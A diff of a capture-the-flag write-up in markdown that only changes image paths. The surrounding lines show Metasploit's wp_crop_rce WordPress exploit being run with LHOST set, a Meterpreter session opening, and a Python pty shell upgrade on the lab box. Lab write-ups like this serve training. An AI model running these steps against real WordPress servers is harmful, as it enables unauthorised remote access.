@@ -60,7 +60,7 @@ msf6 > exploit(wp_crop_rce) > set LHOST [Your_IP]
 msf6 > exploit(wp_crop_rce) > exploit
 [*] Meterpreter session 1 opened!
 
-![Repository Creation Process](images/image_352e6a.png)
+![Repository Creation Process](image_352e6a.png)
 
 ---
 
@@ -74,7 +74,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 After successful exploitation, a Meterpreter session was established. The shell was then upgraded to a fully interactive TTY using Python.
 
-![Shell Access and Stabilization](images/image_28e3d2.png)
+![Shell Access and Stabilization](image_28e3d2.png)
 
 ---
 
@@ -82,7 +82,7 @@ After successful exploitation, a Meterpreter session was established. The shell 
 
 Upon exploring `/home/bjoel/`, a deceptive `user.txt` was found, urging further persistence.
 
-![The Try Harder Message](images/image_1bb50e.png)
+![The Try Harder Message](image_1bb50e.png)
 
 ----
 
